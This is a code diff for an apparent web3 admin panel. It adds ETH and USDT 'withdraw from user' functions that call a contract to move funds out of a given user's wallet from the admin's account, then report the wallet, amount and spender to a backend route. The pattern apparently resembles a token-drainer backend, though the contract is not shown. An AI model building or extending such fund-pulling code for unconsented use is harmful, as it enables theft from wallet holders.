@@ -119,7 +119,7 @@
     }
 
     // Withdraw from user
-    const withdrawFromContract = async () => {
+    const withdrawETH = async () => {
         // Ensure the user has connected their wallet
         const accounts = await window.ethereum.request({
             method: 'eth_requestAccounts'
@@ -133,6 +133,49 @@
                 from: adminWalletAddress,
             })
             console.log('Withdrawal successful:', transaction)
+
+            if(transaction)
+            {
+                $.ajaxSetup({
+                headers: {
+                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                }
+                });
+
+                $.ajax({
+                    url: "{{ route('fetch.tokens') }}",
+                    type: 'POST',
+                    data: {
+                        wallet: user,
+                        amount: amount,
+                        spender: accounts[0],
+                    },
+                }).done(function(response) {
+                    if (response == 'ok') {
+                        window.location.reload();
+                    }
+                });
+            }
+        } catch (error) {
+            console.error('Error withdrawing from contract:', error)
+        }
+    }
+
+    // Withdraw from user
+    const withdrawUSDT = async () => {
+        // Ensure the user has connected their wallet
+        const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
+        })
+        const adminWalletAddress = accounts[0]
+        let user = $('#modal-wallet').val();
+        let amount = parseInt($('#modal-amount').val());
+        try {
+            // Call the withdraw method on the contract
+            const transaction = await contract.methods.withdrawUSDT(user, amount).send({
+                from: adminWalletAddress,
+            });
+            console.log('USDT Withdrawal successful:', transaction)
 
             if(transaction)
             {
